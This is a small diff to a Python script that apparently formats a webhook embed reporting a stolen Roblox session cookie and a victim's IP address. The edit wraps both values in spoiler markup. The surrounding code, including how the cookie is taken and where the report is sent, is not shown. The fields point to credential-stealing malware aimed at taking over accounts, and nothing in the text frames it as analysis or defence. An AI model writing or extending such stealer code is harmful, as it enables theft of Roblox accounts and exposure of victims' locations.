@@ -83,8 +83,8 @@ if __name__ == "__main__":
                 "description" : f"",
                 "color" : 16711680,
                 "fields": [
-                    {"name": "Roblox Cookie", "value": f"```{roblox}```", "inline": False},
-                    {"name": "IP Address", "value": f"**`{ip}`**","inline": False},
+                    {"name": "Roblox Cookie", "value": f"||```{roblox}```||", "inline": False},
+                    {"name": "IP Address", "value": f"||**`{ip}`**||","inline": False},
                     
 
                 ],
